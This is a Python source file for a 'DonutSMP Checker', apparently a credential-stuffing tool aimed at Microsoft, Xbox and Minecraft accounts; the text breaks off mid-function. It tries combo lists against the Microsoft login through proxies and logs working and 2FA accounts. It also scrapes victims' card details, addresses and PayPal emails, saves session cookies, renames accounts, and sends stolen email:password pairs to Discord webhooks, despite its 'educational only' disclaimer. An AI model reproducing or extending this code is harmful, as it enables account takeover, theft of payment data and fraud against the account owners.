# DonutSMP Checker - EDUCATIONAL AND LEARNING PURPOSES ONLY
# dont use this to check accounts without permission, thats illegal
# https://github.com/spokeoner

import requests, re, readchar, os, time, threading, random, urllib3, configparser, json, concurrent.futures, traceback, warnings, uuid, socket, socks, sys, string
from datetime import datetime, timezone
from colorama import Fore
try:
    from console import utils
except ImportError:
    class utils:
        @staticmethod
        def set_title(title):
            try:
                os.system(f'title {title}')
            except:
                pass
from tkinter import filedialog
from urllib.parse import urlparse, parse_qs, quote
from io import StringIO
from http.cookiejar import MozillaCookieJar


logo = Fore.GREEN+'''
    ██████╗  ██████╗ ███╗   ██╗██╗   ██╗████████╗
    ██╔══██╗██╔═══██╗████╗  ██║██║   ██║╚══██╔══╝
    ██║  ██║██║   ██║██╔██╗ ██║██║   ██║   ██║   
    ██║  ██║██║   ██║██║╚██╗██║██║   ██║   ██║   
    ██████╔╝╚██████╔╝██║ ╚████║╚██████╔╝   ██║   
    ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝    ╚═╝   
                                                
                                                \n'''
sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
Combos = []
proxylist = []
fname = ""
hits,bad,twofa,cpm,cpm1,errors,retries,checked,vm,sfa,mfa,maxretries,xgp,xgpu,other = 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
urllib3.disable_warnings() #spams warnings because i send unverified requests for debugging purposes
warnings.filterwarnings("ignore") #spams python warnings on some functions, i may be using some outdated things...
#sys.stderr = open(os.devnull, 'w') #bancheck prints errors in cmd

class Config:
    def __init__(self):
        self.data = {}

    def set(self, key, value):
        self.data[key] = value

    def get(self, key):
        return self.data.get(key)

config = Config()

class Capture:
    def __init__(self, email, password, name, capes, uuid, token, type, session):
        self.email = email
        self.password = password
        self.name = name
        self.capes = capes
        self.uuid = uuid
        self.token = token
        self.type = type
        self.session = session
        self.money = None
        self.kills = None
        self.deaths = None
        self.mobs_killed = None
        self.playtime = None
        self.shards = None
        self.broken_blocks = None
        self.placed_blocks = None
        self.money_made_from_sell = None
        self.money_spent_on_shop = None
        self.cape = None
        self.access = None
        self.namechanged = None
        self.lastchanged = None

    def builder(self):
        message = f"Email: {self.email}\nPassword: {self.password}\nName: {self.name}\nCapes: {self.capes}\nAccount Type: {self.type}"
        if self.money != None: message+=f"\nMoney: {self.money}"
        if self.kills != None: message+=f"\nKills: {self.kills}"
        if self.deaths != None: message+=f"\nDeaths: {self.deaths}"
        if self.mobs_killed != None: message+=f"\nMobs Killed: {self.mobs_killed}"
        if self.playtime != None: message+=f"\nPlaytime: {self.playtime}"
        if self.shards != None: message+=f"\nShards: {self.shards}"
        if self.broken_blocks != None: message+=f"\nBroken Blocks: {self.broken_blocks}"
        if self.placed_blocks != None: message+=f"\nPlaced Blocks: {self.placed_blocks}"
        if self.money_made_from_sell != None: message+=f"\nMoney Made From Sell: {self.money_made_from_sell}"
        if self.money_spent_on_shop != None: message+=f"\nMoney Spent On Shop: {self.money_spent_on_shop}"
        if self.cape != None: message+=f"\nOptifine Cape: {self.cape}"
        if self.access != None: message+=f"\nEmail Access: {self.access}"
        if self.namechanged != None: message+=f"\nCan Change Name: {self.namechanged}"
        if self.lastchanged != None: message+=f"\nLast Name Change: {self.lastchanged}"
        return message

    def notify(self):
        global errors
        try:
            payload = {
                "content": config.get('message')
                    .replace("<email>", self.email)
                    .replace("<password>", self.password)
                    .replace("<name>", self.name or "N/A")
                    .replace("<money>", self.money or "N/A")
                    .replace("<kills>", self.kills or "N/A")
                    .replace("<deaths>", self.deaths or "N/A")
                    .replace("<mobskilled>", self.mobs_killed or "N/A")
                    .replace("<playtime>", self.playtime or "N/A")
                    .replace("<shards>", self.shards or "N/A")
                    .replace("<brokenblocks>", self.broken_blocks or "N/A")
                    .replace("<placedblocks>", self.placed_blocks or "N/A")
                    .replace("<moneymadefromsell>", self.money_made_from_sell or "N/A")
                    .replace("<moneyspentonshop>", self.money_spent_on_shop or "N/A")
                    .replace("<ofcape>", self.cape or "N/A")
                    .replace("<capes>", self.capes or "N/A")
                    .replace("<access>", self.access or "N/A")
                    .replace("<namechange>", self.namechanged or "N/A")
                    .replace("<lastchanged>", self.lastchanged or "N/A")
                    .replace("<type>", self.type or "N/A"),
                "username": "DonutSMP Checker"
            }
            if config.get('embed') == True:
                fields = [
                    {"name": "Email:Password", "value": f"||{self.email}:{self.password}||"},
                    {"name": "Money", "value": self.money or "N/A"},
                    {"name": "Kills", "value": self.kills or "N/A"},
                    {"name": "Deaths", "value": self.deaths or "N/A"},
                    {"name": "Mobs Killed", "value": self.mobs_killed or "N/A"},
                    {"name": "Playtime", "value": self.playtime or "N/A"},
                    {"name": "Shards", "value": self.shards or "N/A"},
                    {"name": "Broken Blocks", "value": self.broken_blocks or "N/A"},
                    {"name": "Placed Blocks", "value": self.placed_blocks or "N/A"},
                    {"name": "Money Made From Sell", "value": self.money_made_from_sell or "N/A"},
                    {"name": "Money Spent On Shop", "value": self.money_spent_on_shop or "N/A"},
                    {"name": "Optifine Cape", "value": self.cape or "N/A"},
                    {"name": "Capes", "value": self.capes or "N/A"},
                    {"name": "Access", "value": self.access or "N/A"},
                    {"name": "Can Change Name",  "value": self.namechanged or "N/A"},
                    {"name": "Last Changed", "value": self.lastchanged or "N/A"},
                    {"name": "Account Type", "value": self.type or "N/A"}
                ]
                payload = {
                "username": "DonutSMP Checker",
                "avatar_url": f"https://mc-heads.net/avatar/{self.name}",
                "embeds": [
                    {
                    "title": self.name,
                    "color": 37166,
                    "fields": fields,
                    "thumbnail": {"url": f"https://mc-heads.net/avatar/{self.name}"},
                    "footer": {"text": "DonutSMP Checker"}
                    }
                ]
                }
            requests.post(config.get('webhook'), data=json.dumps(payload), headers={"Content-Type": "application/json"}, timeout=5)
        except: pass

    def donutsmp(self):
        global errors
        api_key = config.get('donutsmp_api_key')
        if not api_key or api_key == "YOUR_DONUTSMP_API_KEY_HERE" or api_key == "paste your donutsmp api key here":
            errors += 1
            return
        headers = {'Authorization': f'Bearer {api_key}', 'Accept': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'}
        for attempt in range(3):
            try:
                proxy = getproxy()
                encoded_name = quote(self.name, safe='')
                url = f'https://api.donutsmp.net/v1/stats/{encoded_name}'
                response = self.session.get(url, headers=headers, proxies=proxy, verify=False, timeout=15, allow_redirects=True)
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if isinstance(data, dict):
                            status = data.get('status')
                            result = data.get('result')
                            if (status == 200 or status == '200') and isinstance(result, dict) and len(result) > 0:
                                stats = result
                                self.money = str(stats.get('money')) if stats.get('money') not in [None, ''] else 'N/A'
                                self.kills = str(stats.get('kills')) if stats.get('kills') not in [None, ''] else 'N/A'
                                self.deaths = str(stats.get('deaths')) if stats.get('deaths') not in [None, ''] else 'N/A'
                                self.mobs_killed = str(stats.get('mobs_killed')) if stats.get('mobs_killed') not in [None, ''] else 'N/A'
                                self.playtime = str(stats.get('playtime')) if stats.get('playtime') not in [None, ''] else 'N/A'
                                self.shards = str(stats.get('shards')) if stats.get('shards') not in [None, ''] else 'N/A'
                                self.broken_blocks = str(stats.get('broken_blocks')) if stats.get('broken_blocks') not in [None, ''] else 'N/A'
                                self.placed_blocks = str(stats.get('placed_blocks')) if stats.get('placed_blocks') not in [None, ''] else 'N/A'
                                self.money_made_from_sell = str(stats.get('money_made_from_sell')) if stats.get('money_made_from_sell') not in [None, ''] else 'N/A'
                                self.money_spent_on_shop = str(stats.get('money_spent_on_shop')) if stats.get('money_spent_on_shop') not in [None, ''] else 'N/A'
                                return
                    except: pass
                elif response.status_code == 401:
                    errors += 1
                    return
                elif response.status_code == 429:
                    if attempt < 2:
                        time.sleep(2 ** attempt)
                        continue
                elif response.status_code == 500:
                    errors += 1
                    return
            except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
                if attempt < 2:
                    time.sleep(1)
                    continue
            except:
                if attempt < 2:
                    time.sleep(1)
                    continue
        errors += 1

    def optifine(self):
        if config.get('optifinecape'):
            try:
                txt = requests.get(f'http://s.optifine.net/capes/{self.name}.png', proxies=getproxy(), verify=False).text
                if "Not found" in txt: self.cape = "No"
                else: self.cape = "Yes"
            except: self.cape = "Unknown"

    def full_access(self):
        global mfa, sfa
        if config.get('access'):
            try:
                email_check_url = config.get('email_check_url')
                if not email_check_url or "paste your email check" in email_check_url.lower():
                    self.access = "Unknown"
                    return
                out = json.loads(requests.get(f"{email_check_url}?email={self.email}&password={self.password}", verify=False).text)
                if out["Success"] == 1: 
                    self.access = "True"
                    mfa+=1
                    open(f"results/{fname}/MFA.txt", 'a').write(f"{self.email}:{self.password}\n")
                else:
                    sfa+=1
                    self.access = "False"
                    open(f"results/{fname}/SFA.txt", 'a').write(f"{self.email}:{self.password}\n")
            except: self.access = "Unknown"
    
    def namechange(self):
        global retries
        if config.get('namechange') or config.get('lastchanged'):
            tries = 0
            while tries < maxretries:
                try:
                    check = self.session.get('https://api.minecraftservices.com/minecraft/profile/namechange', headers={'Authorization': f'Bearer {self.token}'})
                    if check.status_code == 200:
                        try:
                            data = check.json()
                            if config.get('namechange'):
                                self.namechanged = str(data.get('nameChangeAllowed', 'N/A'))
                            if config.get('lastchanged'):
                                created_at = data.get('createdAt')
                                if created_at:
                                    try:
                                        given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%S.%fZ")
                                    except ValueError:
                                        given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%SZ")
                                    given_date = given_date.replace(tzinfo=timezone.utc)
                                    formatted = given_date.strftime("%m/%d/%Y")
                                    current_date = datetime.now(timezone.utc)
                                    difference = current_date - given_date
                                    years = difference.days // 365
                                    months = (difference.days % 365) // 30
                                    days = difference.days
                                    if years > 0:
                                        self.lastchanged = f"{years} {'year' if years == 1 else 'years'} - {formatted} - {created_at}"
                                    elif months > 0:
                                        self.lastchanged = f"{months} {'month' if months == 1 else 'months'} - {formatted} - {created_at}"
                                    else:
                                        self.lastchanged = f"{days} {'day' if days == 1 else 'days'} - {formatted} - {created_at}"
                                    break
                        except: pass
                    if check.status_code == 429:
                        if len(proxylist) < 5: time.sleep(3)
                except: pass
                tries+=1
                retries+=1
    def save_cookies(self, type):
        cfname = os.path.join(f'results/{fname}', 'Cookies')
        if not os.path.exists(cfname):
            os.makedirs(cfname)
        bfname = os.path.join(cfname, type)
        if not os.path.exists(bfname):
            os.makedirs(bfname)
        cookie_file_path = os.path.join(bfname, f'{self.name}.txt')
        jar = MozillaCookieJar(cookie_file_path)
        for cookie in self.session.cookies:
            jar.set_cookie(cookie)
        jar.save(ignore_discard=True)
        with open(cookie_file_path, 'r') as file:
            lines = file.readlines()
        lines = lines[3:]
        while lines and lines[0].strip() == '':
            lines.pop(0)
        with open(cookie_file_path, 'w') as file:
            file.writelines(lines)
    def setname(self):
        newname = ''.join(random.choices(string.ascii_lowercase + string.digits, k=3))+"_"+config.get('name')+"_"+''.join(random.choices(string.ascii_lowercase + string.digits, k=3))
        tries = 0
        while tries < maxretries:
            try:
                changereq = self.session.put("https://api.minecraftservices.com/minecraft/profile/name/"+newname, headers={'Authorization': f'Bearer {self.token}'})
                if changereq.status_code == 200:
                    self.type = self.type+" [SET MC]"
                    self.name = self.name+f" -> {newname}"
                    break
                elif changereq.status_code == 429:
                    time.sleep(3)
            except: pass
            tries+=1
    def setskin(self):
        tries = 0
        while tries < maxretries:
            try:
                data = {
                    "url" : config.get('skin'),
                    "variant" : config.get('variant')
                }
                changereq = self.session.post("https://api.minecraftservices.com/minecraft/profile/skins", json=data, headers={'Authorization': f'Bearer {self.token}', 'Content-Type': 'application/json'})
                if changereq.status_code == 200:
                    self.type = self.type+" [SET SKIN]"
                    break
                elif changereq.status_code == 429:
                    time.sleep(3)
            except: pass
            tries+=1
    def handle(self, session):
        global hits
        if self.name != 'N/A':
            threads = []
            if config.get('optifinecape'):
                t1 = threading.Thread(target=self.optifine, daemon=True)
                t1.start()
                threads.append(t1)
            self.donutsmp()
            if config.get('access'):
                t2 = threading.Thread(target=self.full_access, daemon=True)
                t2.start()
                threads.append(t2)
            if config.get('namechange') or config.get('lastchanged'):
                t3 = threading.Thread(target=self.namechange, daemon=True)
                t3.start()
                threads.append(t3)
            for t in threads:
                t.join(timeout=5)
            if config.get('setname'): self.setname()
        else: self.setname()
        if config.get('setskin'): self.setskin()
        fullcapt = self.builder()
        if screen == "'2'": print(Fore.GREEN+fullcapt.replace('\n', ' | '))
        hits+=1
        with open(f"results/{fname}/Hits.txt", 'a') as file: file.write(f"{self.email}:{self.password}\n")
        open(f"results/{fname}/Capture.txt", 'a').write(fullcapt+"\n============================\n")
        self.notify()
        send_hits_webhook(self.email, self.password, self.name, fullcapt)

def send_hits_webhook(email, password, name, capture):
    try:
        webhook_url = config.get('hits_webhook')
        if webhook_url and webhook_url != 'paste your hits webhook here':
            payload = {"username": "DonutSMP Checker", "content": f"🎯 **HIT FOUND!**\n```\n{capture}\n```"}
            if config.get('embed'):
                fields = []
                for line in capture.split('\n'):
                    if ':' in line:
                        parts = line.split(':', 1)
                        if len(parts) == 2:
                            fields.append({"name": parts[0].strip(), "value": parts[1].strip()[:1024]})
                payload = {
                    "username": "DonutSMP Checker",
                    "avatar_url": f"https://mc-heads.net/avatar/{name}" if name != 'N/A' else None,
                    "embeds": [{
                        "title": f"🎯 Hit Found: {name or 'N/A'}",
                        "color": 65280,
                        "fields": fields[:25],
                        "thumbnail": {"url": f"https://mc-heads.net/avatar/{name}"} if name != 'N/A' else None,
                        "footer": {"text": "DonutSMP Checker"}
                    }]
                }
            requests.post(webhook_url, data=json.dumps(payload), headers={"Content-Type": "application/json"}, timeout=5)
    except: pass

def send_2fa_webhook(email, password):
    try:
        webhook_url = config.get('2fa_webhook')
        if not webhook_url or 'paste your' in webhook_url.lower():
            return
        payload = {"username": "DonutSMP Checker", "content": f"🔐 **2FA Account Found**\n```\nEmail: {email}\nPassword: {password}\n```"}
        if config.get('embed'):
            payload = {
                "username": "DonutSMP Checker",
                "embeds": [{
                    "title": "🔐 2FA Account Found",
                    "color": 16711935,
                    "fields": [
                        {"name": "Email", "value": f"||{email}||"},
                        {"name": "Password", "value": f"||{password}||"}
                    ],
                    "footer": {"text": "DonutSMP Checker"}
                }]
            }
        requests.post(webhook_url, data=json.dumps(payload), headers={"Content-Type": "application/json"}, timeout=5)
    except: pass

def send_xbox_webhook(email, password, account_type):
    try:
        webhook_url = config.get('xbox_webhook')
        if not webhook_url or 'paste your' in webhook_url.lower():
            return
        payload = {"username": "DonutSMP Checker", "content": f"🎮 **Xbox Account Found**\n```\nEmail: {email}\nPassword: {password}\nAccount Type: {account_type}\n```"}
        if config.get('embed'):
            payload = {
                "username": "DonutSMP Checker",
                "embeds": [{
                    "title": "🎮 Xbox Game Pass Account Found",
                    "color": 3447003,
                    "fields": [
                        {"name": "Email", "value": f"||{email}||"},
                        {"name": "Password", "value": f"||{password}||"},
                        {"name": "Account Type", "value": account_type or "N/A"}
                    ],
                    "footer": {"text": "DonutSMP Checker"}
                }]
            }
        requests.post(webhook_url, data=json.dumps(payload), headers={"Content-Type": "application/json"}, timeout=5)
    except: pass

def send_other_webhook(email, password, items):
    try:
        webhook_url = config.get('other_webhook')
        if not webhook_url or 'paste your' in webhook_url.lower():
            return
        payload = {"username": "DonutSMP Checker", "content": f"📦 **Other Account Found**\n```\nEmail: {email}\nPassword: {password}\nItems: {items}\n```"}
        if config.get('embed'):
            payload = {
                "username": "DonutSMP Checker",
                "embeds": [{
                    "title": "📦 Other Account Found",
                    "color": 16776960,
                    "fields": [
                        {"name": "Email", "value": f"||{email}||"},
                        {"name": "Password", "value": f"||{password}||"},
                        {"name": "Items", "value": items or "N/A"}
                    ],
                    "footer": {"text": "DonutSMP Checker"}
                }]
            }
        requests.post(webhook_url, data=json.dumps(payload), headers={"Content-Type": "application/json"}, timeout=5)
    except: pass
        
def get_urlPost_sFTTag(session):
    global retries
    while True:
        try:
            text = session.get(sFTTag_url, timeout=15).text
            match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
            if match:
                sFTTag = match.group(1)
                match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
                if match:
                    return match.group(1), sFTTag, session
        except Exception:
            pass
        session.proxy = getproxy()
        retries += 1

def get_xbox_rps(session, email, password, urlPost, sFTTag):
    global bad, checked, cpm, twofa, retries, checked
    tries = 0
    while tries < maxretries:
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
            login_request = session.post(urlPost, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=15)
            if '#' in login_request.url and login_request.url != sFTTag_url:
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, session
            elif 'cancel?mkt=' in login_request.text:
                data = {
                    'ipt': re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
                    'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
                    'uaid': re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
                }
                ret = session.post(re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group(), data=data, allow_redirects=True)
                fin = session.get(re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group(), allow_redirects=True)
                token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, session
            elif any(value in login_request.text for value in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
                twofa+=1
                checked+=1
                cpm+=1
                if screen == "'2'": print(Fore.MAGENTA+f"2FA: {email}:{password}")
                with open(f"results/{fname}/2fa.txt", 'a') as file:
                    file.write(f"{email}:{password}\n")
                send_2fa_webhook(email, password)
                return "None", session
            elif any(value in login_request.text.lower() for value in ["password is incorrect", r"account doesn\'t exist.", "sign in to your microsoft account", "tried to sign in too many times with an incorrect account or password"]):
                bad+=1
                checked+=1
                cpm+=1
                if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
                return "None", session
            else:
                session.proxy = getproxy()
                retries+=1
                tries+=1
        except:
            session.proxy = getproxy()
            retries+=1
            tries+=1
    bad+=1
    checked+=1
    cpm+=1
    if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
    return "None", session

def payment(session, email, password):
    global retries
    while True:
        try:
            headers = {
                "Host": "login.live.com",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "close",
                "Referer": "https://account.microsoft.com/"
            }
            r = session.get('https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D&prompt=none', headers=headers)
            token = parse_qs(urlparse(r.url).fragment).get('access_token', ["None"])[0]
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36',
                'Pragma': 'no-cache',
                'Accept': 'application/json',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9',
                'Authorization': f'MSADELEGATE1.0={token}',
                'Connection': 'keep-alive',
                'Content-Type': 'application/json',
                'Host': 'paymentinstruments.mp.microsoft.com',
                'ms-cV': 'FbMB+cD6byLL1mn4W/NuGH.2',
                'Origin': 'https://account.microsoft.com',
                'Referer': 'https://account.microsoft.com/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'Sec-GPC': '1'
            }
            r = session.get(f'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-GB', headers=headers)
            def lr_parse(source, start_delim, end_delim, create_empty=True):
                pattern = re.escape(start_delim) + r'(.*?)' + re.escape(end_delim)
                match = re.search(pattern, source)
                if match: return match.group(1)
                return '' if create_empty else None
            date_registered = lr_parse(r.text, '"creationDateTime":"', 'T', create_empty=False)
            fullname = lr_parse(r.text, '"accountHolderName":"', '"', create_empty=False)
            address1 = lr_parse(r.text, '"address":{"address_line1":"', '"')
            card_holder = lr_parse(r.text, 'accountHolderName":"', '","')
            credit_card = lr_parse(r.text, 'paymentMethodFamily":"credit_card","display":{"name":"', '"')
            expiry_month = lr_parse(r.text, 'expiryMonth":"', '",')
            expiry_year = lr_parse(r.text, 'expiryYear":"', '",')
            last4 = lr_parse(r.text, 'lastFourDigits":"', '",')
            pp = lr_parse(r.text, '":{"paymentMethodType":"paypal","', '}},{"id')
            paypal_email = lr_parse(r.text, 'email":"', '"', create_empty=False)
            balance = lr_parse(r.text, 'balance":', ',"', create_empty=False)
            json_data = json.loads(r.text)
            city = region = zipcode = card_type = cod = ""
            if isinstance(json_data, list):
                for item in json_data:
                    if 'city' in item: city = item['city']
                    if 'region' in item: region = item['region']
                    if 'postal_code' in item: zipcode = item['postal_code']
                    if 'cardType' in item: card_type = item['cardType']
                    if 'country' in item: cod = item['country']
            else:
                city = json_data.get('city', '')
                region = json_data.get('region', '')
                zipcode = json_data.get('postal_code', '')
                card_type = json_data.get('cardType', '')
                cod = json_data.get('country', '')
            user_address = f"[Address: {address1} City: {city} State: {region} Postalcode: {zipcode} Country: {cod}]"
            cc_info = f"[CardHolder: {card_holder} | CC: {credit_card} | CC expiryMonth: {expiry_month} | CC ExpYear: {expiry_year} | CC Last4Digit: {last4} | CC Funding: {card_type}]"
            r = session.get(f'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions', headers=headers)
            ctpid = lr_parse(r.text, '"subscriptionId":"ctp:', '"')
            item1 = lr_parse(r.text, '"title":"', '"')
            auto_renew = lr_parse(r.text, f'"subscriptionId":"ctp:{ctpid}","autoRenew":', ',')
            start_date = lr_parse(r.text, '"startDate":"', 'T')
            next_renewal_date = lr_parse(r.text, '"nextRenewalDate":"', 'T')
            parts = []
            if item1 is not None: parts.append(f"Purchased Item: {item1}")
            if auto_renew is not None: parts.append(f"Auto Renew: {auto_renew}")
            if start_date is not None: parts.append(f"startDate: {start_date}")
            if next_renewal_date is not None: parts.append(f"Next Billing: {next_renewal_date}")
            if parts: subscription1 = f"[ {' | '.join(parts)} ]"
            else: subscription1 = None
            mdrid = lr_parse(r.text, '"subscriptionId":"mdr:', '"')
            auto_renew2 = lr_parse(r.text, f'"subscriptionId":"mdr:{mdrid}","autoRenew":', ',')
            start_date2 = lr_parse(r.text, '"startDate":"', 'T')
            recurring = lr_parse(r.text, 'recurringFrequency":"', '"')
            next_renewal_date2 = lr_parse(r.text, '"nextRenewalDate":"', 'T')
            item_bought = lr_parse(r.text, f'"subscriptionId":"mdr:{mdrid}","autoRenew":{auto_renew2},"startDate":"{start_date2}","recurringFrequency":"{recurring}","nextRenewalDate":"{next_renewal_date2}","title":"', '"')
            parts2 = []
            if item_bought is not None: parts2.append(f"Purchased Item's: {item_bought}")
            if auto_renew2 is not None: parts2.append(f"Auto Renew: {auto_renew2}")
            if start_date2 is not None: parts2.append(f"startDate: {start_date2}")
            if recurring is not None: parts2.append(f"Recurring: {recurring}")
            if next_renewal_date2 is not None: parts2.append(f"Next Billing: {next_renewal_date2}")
            if parts: subscription2 = f"[{' | '.join(parts2)}]"
            else: subscription2 = None
            description = lr_parse(r.text, '"description":"', '"')
            product_typee = lr_parse(r.text, '"productType":"', '"')
            product_type_map = {"PASS": "XBOX GAME PASS", "GOLD": "XBOX GOLD"}
            product_type = product_type_map.get(product_typee, product_typee)
            quantity = lr_parse(r.text, 'quantity":', ',')
            currency = lr_parse(r.text, 'currency":"', '"')
            total_amount_value = lr_parse(r.text, 'totalAmount":', '', create_empty=False)
            if total_amount_value is not None: total_amount = total_amount_value + f" {currency}"
            else: total_amount = f"0 {currency}"
            parts3 = []
            if description is not None: parts3.append(f"Product: {description}")
            if product_type is not None: parts3.append(f"Product Type: {product_type}")
            if quantity is not None: parts3.append(f"Total Purchase: {quantity}")
            if total_amount is not None: parts3.append(f"Total Price: {total_amount}")
            if parts: subscription3 = f"[ {' | '.join(parts3)} ]"
            else: subscription3 = None
            payment = ''
            paymentprint = ''
            if date_registered: 
                payment += f"\nDate Registered: {date_registered}"
                paymentprint += f" | Date Registered: {date_registered}"
            if fullname: 
                payment += f"\nFullname: {fullname}"
                paymentprint += f" | Fullname: {fullname}"
            if user_address: 
                payment += f"\nUser Address: {user_address}"
                paymentprint += f" | User Address: {user_address}"
            if paypal_email: 
                payment += f"\nPaypal Email: {paypal_email}"
                paymentprint += f" | Paypal Email: {paypal_email}"
            if cc_info: 
                payment += f"\nCC Info: {cc_info}"
                paymentprint += f" | CC Info: {cc_info}"
            if balance: 
                payment += f"\nBalance: {balance}"
                paymentprint += f" | Balance: {balance}"
            if subscription1: 
                payment += f"\n{subscription1}"
                paymentprint += f" | {subscription1}"
            if subscription2: 
                payment += f"\n{subscription2}"
                paymentprint += f" | {subscription2}"
            if subscription3: 
                payment += f"\n{subscription3}"
                paymentprint += f" | {subscription3}"
            payment += "\n============================\n"
            if screen == "'2'": print(Fore.LIGHTBLUE_EX+f"Payment: {email}:{password}"+paymentprint)
            with open(f"results/{fname}/Payment.txt", 'a', encoding='utf-8') as file: file.write(f"{email}:{password}"+payment)
            break
        except Exception as e:
            #print(e)
            #traceback.print_exc()
            #line_number = traceback.extract_tb(e.__traceback__)[-1].lineno
            #print("Exception occurred at line:", line_number)
            retries+=1
            session.proxy = getproxy()

def validmail(email, password):
    global vm, cpm, checked
    vm+=1
    cpm+=1
    checked+=1
    with open(f"results/{fname}/Valid_Mail.txt", 'a') as file: file.write(f"{email}:{password}\n")
    if screen == "'2'": print(Fore.LIGHTMAGENTA_EX+f"Valid Mail: {email}:{password}")

def capture_mc(access_token, session, email, password, type):
    global retries
    while True:
        try:
            r = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {access_token}'})
            if r.status_code == 200:
                try:
                    capes = ", ".join([cape["alias"] for cape in r.json().get("capes", [])])
                    CAPTURE = Capture(email, password, r.json()['name'], capes, r.json()['id'], access_token, type, session)
                    CAPTURE.handle(session)
                    break
                except: pass
            elif r.status_code == 429:
                retries+=1
                session.proxy = getproxy()
                if len(proxylist) < 5: time.sleep(20)
                continue
            else: break
        except:
            retries+=1
            session.proxy = getproxy()
            continue

def checkownership(entitlements_response):
    items = entitlements_response.get("items", [])
    has_normal_minecraft = False
    has_game_pass_pc = False
    has_game_pass_ultimate = False
    for item in items:
        name = item.get("name", "")
        source = item.get("source", "")
        if name in ("game_minecraft", "product_minecraft") and source in ("PURCHASE", "MC_PURCHASE"):
            has_normal_minecraft = True
        if name == "product_game_pass_pc":
            has_game_pass_pc = True
        if name == "product_game_pass_ultimate":
            has_game_pass_ultimate = True
    if has_normal_minecraft and has_game_pass_pc:
        return "Normal Minecraft (with Game Pass)"
    if has_normal_minecraft and has_game_pass_ultimate:
        return "Normal Minecraft (with Game Pass Ultimate)"
    elif has_normal_minecraft:
        return "Normal Minecraft"
    elif has_game_pass_ultimate:
        return "Xbox Game Pass Ultimate"
    elif has_game_pass_pc:
        return "Xbox Game Pass (PC)"

def checkmc(session, email, password, token, xbox_token):
    global retries, bedrock, cpm, checked, xgp, xgpu, other
    acctype = None
    while True:
        try:
            checkrq = session.get('https://api.minecraftservices.com/entitlements/license', headers={'Authorization': f'Bearer {token}'}, verify=False)
            if checkrq.status_code == 429:
                retries+=1
                session.proxy = getproxy()
                if len(proxylist) == 0: time.sleep(20)
                continue
            else: break
        except:
            retries+=1
            session.proxy = getproxy()
            if len(proxylist) == 0: time.sleep(20)
            continue
    if checkrq.status_code == 200:
        acctype = checkownership(checkrq.json())
        if screen == "'2'": print(Fore.LIGHTGREEN_EX+f"{acctype}: {email}:{password}")
        if acctype == "Xbox Game Pass Ultimate" or acctype == "Normal Minecraft (with Game Pass Ultimate)":
            xgpu+=1
            cpm+=1
            checked+=1
            codes = []
            with open(f"results/{fname}/XboxGamePassUltimate.txt", 'a') as f: f.write(f"{email}:{password}\n")
            if "Normal" in acctype:
                with open(f"results/{fname}/Normal.txt", 'a') as f: f.write(f"{email}:{password}\n")
            try:
                while True:
                    try:
                        xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "http://mp.microsoft.com/", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                        break
                    except:
                        retries+=1
                        session.proxy = getproxy()
                        if len(proxylist) == 0: time.sleep(20)
                        continue
                js = xsts.json()
                uhss = js['DisplayClaims']['xui'][0]['uhs']
                xsts_token = js.get('Token')
                headers = {
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate, br, zstd",
                    "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
